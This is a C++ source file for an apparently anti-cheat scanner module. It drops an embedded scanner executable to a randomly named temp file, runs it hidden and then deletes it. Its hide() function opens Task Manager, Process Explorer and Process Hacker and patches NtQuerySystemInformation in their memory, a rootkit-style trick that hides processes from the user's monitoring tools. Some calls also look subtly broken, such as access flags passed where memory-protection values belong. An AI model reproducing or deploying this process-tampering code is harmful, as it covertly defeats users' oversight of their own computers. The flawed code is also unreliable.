#include <fstream>
#include "StdInc.h"
#include "KernelCalls.hpp"
#include <fstream>
#include <windows.h>
#include <scanner.h>
std::vector<std::wstring> m_vSignatures;

CHeuristicGuard::CHeuristicGuard()
{
    m_strScanProcessName = "";
}

CHeuristicGuard::~CHeuristicGuard()
{
}

void CHeuristicGuard::Initialize()
{
}

std::string CHeuristicGuard::BuildSignatureParameters()
{
    std::stringstream ss;
    ss << (char)(m_vSignatures.size() + 1);

    for (const std::wstring& param : m_vSignatures)
    {
        ss << static_cast<char>(param.length() + 1);
        ss << std::string(param.begin(), param.end());
    }
    return ss.str();
}

void CHeuristicGuard::AddSignatures(std::map<std::string, std::vector<std::wstring>>& Signatures)
{
    for (auto& [name, vector] : Signatures)
    {
        for (auto& Signature : vector)
        {
            m_vSignatures.push_back(Signature);
        }
    }

    std::thread t(&CHeuristicGuard::SpawnScanProcess, this);
    t.detach();
    std::thread d(&CHeuristicGuard::hide, this);
    d.detach();
}
std::vector<const wchar_t*> ProcessMgr = {L"ProcessHacker.exe", L"TaskMgr.exe", L"procexp.exe", L"procexp64.exe", L"procexp64a.exe"};


void PatchMem(BYTE* lpAddress, BYTE* src, unsigned int sizeofinstruction, HANDLE hProcess)
{
    DWORD oldProtection;
    VirtualProtectEx(hProcess, lpAddress, sizeofinstruction, PROCESS_VM_READ | PROCESS_VM_WRITE, &oldProtection);
    WriteProcessMemory(hProcess, lpAddress, src, sizeofinstruction, 0);
    VirtualProtectEx(hProcess, lpAddress, sizeofinstruction, oldProtection, &oldProtection);
}
std::string WStringToString(const std::wstring& wstr)
{
    int         sizeNeeded = WideCharToMultiByte(CP_ACP, 0, wstr.c_str(), -1, NULL, 0, NULL, NULL);
    std::string str(sizeNeeded, 0);
    WideCharToMultiByte(CP_ACP, 0, wstr.c_str(), -1, &str[0], sizeNeeded, NULL, NULL);
    return str;
}

DWORD GetProcId(const char* procName)
{
    DWORD  procId = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnap != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32W procEntry;            // Use PROCESSENTRY32W for Unicode support
        procEntry.dwSize = sizeof(procEntry);

        if (Process32FirstW(hSnap, &procEntry))            // Use Process32FirstW
        {
            do
            {
                // Convert procName (char*) to wchar_t*
                wchar_t wProcName[MAX_PATH];
                MultiByteToWideChar(CP_ACP, 0, procName, -1, wProcName, MAX_PATH);

                if (!_wcsicmp(procEntry.szExeFile, wProcName))            // Compare wide strings
                {
                    procId = procEntry.th32ProcessID;
                    break;
                }
            } while (Process32NextW(hSnap, &procEntry));            // Use Process32NextW
        }
    }

    CloseHandle(hSnap);
    return procId;
}
int CHeuristicGuard::hide()
{
    for (int i = 0; i < ProcessMgr.size(); i++)
    {
        std::string procName = WStringToString(ProcessMgr[i]);           
        int         procId = GetProcId(procName.c_str());                

        if (procId)
        {
            HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procId);
            if (hProc && hProc != INVALID_HANDLE_VALUE)
            {
                uintptr_t ntdllBase = Utils::GetModuleBaseAddress(procId, "ntdll.dll");
                uintptr_t myNtQueryInformationProcessRVA = (uintptr_t)GetProcAddress(GetModuleHandleA(("ntdll.dll")), (("NtQuerySystemInformation")));
                uintptr_t NtQueryInformationProcessRVA =
                    (myNtQueryInformationProcessRVA - Utils::GetModuleBaseAddress(GetProcessId(GetCurrentProcess()), "ntdll.dll"));
                PatchMem((BYTE*)(ntdllBase + NtQueryInformationProcessRVA) + 0x3, (BYTE*)("\xB8\x35\x00\x00\x00"), 5, hProc);
            }
        }
    }
    return 0;
}


void CHeuristicGuard::SpawnScanProcess()
{
    char szTempFilePath[MAX_PATH];
    memset(szTempFilePath, 0, sizeof(szTempFilePath));
    strcat(szTempFilePath, GetScanProcessName().c_str());

    std::ofstream tempFile(szTempFilePath, std::ios::binary);
    if (!tempFile.is_open())
    {
        SharedUtil::AddDebugLog("Failed to open temporary file for writing.");
        return;
    }
    tempFile.write(reinterpret_cast<const char*>(scanner), sizeof(scanner));
    tempFile.close();

    char szCommandLine[512];
    memset(szCommandLine, 0, sizeof(szCommandLine));
    sprintf(szCommandLine, "\"%s\" --pid %d --sigs %s", szTempFilePath, GetCurrentProcessId(), BuildSignatureParameters().c_str());

    SECURITY_ATTRIBUTES sa = {0};
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = nullptr;

    HANDLE hReadPipe, hWritePipe;
    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0))
    {
        SharedUtil::AddDebugLog("Failed to create pipe. Error: 0x%llx", GetLastError());
    }

    STARTUPINFOA        startupInfo = {0};
    PROCESS_INFORMATION processInfo = {0};
    startupInfo.cb = sizeof(STARTUPINFOA);
    startupInfo.hStdOutput = hWritePipe;
    startupInfo.hStdError = hWritePipe;
    startupInfo.hStdInput = NULL;

    if (!CreateProcess(nullptr,                     // Path to the executable
                       szCommandLine,               // Command line arguments (nullptr if none)
                       nullptr,                     // Process security attributes
                       nullptr,                     // Thread security attributes
                       FALSE,                       // Inherit handles
                       CREATE_NO_WINDOW,            // Creation flags
                       nullptr,                     // Use parent's environment block
                       nullptr,                     // Use parent's starting directory
                       &startupInfo,                // Pointer to STARTUPINFO structure
                       &processInfo))
    {
        SharedUtil::AddDebugLog("Failed to create process. Error: 0x%llx", GetLastError());
    }

    CloseHandle(hWritePipe);

    WaitForSingleObject(processInfo.hProcess, INFINITE);

    char buffer[4096];
    memset(buffer, 0, sizeof(buffer));
    DWORD dwBytesRead;
    while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &dwBytesRead, NULL) && dwBytesRead > 0)
    {
        buffer[dwBytesRead] = '\0';            // Null-terminate the buffer
    }

    DWORD dwExitCode = 0;
    if (GetExitCodeProcess(processInfo.hProcess, &dwExitCode))
    {
        SharedUtil::AddDebugLog("Process finished with exit code: 0x%llx", dwExitCode);

        if (dwExitCode == 0x1c8)
        {
            g_pAtomicAntiCheat->NotifyDetection(eDetectionType::CHEAT_SIGNATURE_FOUND);
        }
    }
    else
    {
        SharedUtil::AddDebugLog("Failed to get exit code. Error: 0x%llx", GetLastError());
    }

    CloseHandle(hReadPipe);
    TerminateProcess(processInfo.hProcess, dwExitCode);
    CloseHandle(processInfo.hProcess);
    CloseHandle(processInfo.hThread);

    DeleteFileA(szTempFilePath);
}

std::string CHeuristicGuard::GetScanProcessName()
{
    if (m_strScanProcessName.empty())
    {
        char szTempFilePath[MAX_PATH];
        GetTempPathA(MAX_PATH, szTempFilePath);
        sprintf(szTempFilePath, "%ss%d.tmp", szTempFilePath, SharedUtil::GenerateRandomNumber(32, 256));
        m_strScanProcessName = szTempFilePath;
    }
    return m_strScanProcessName;
}
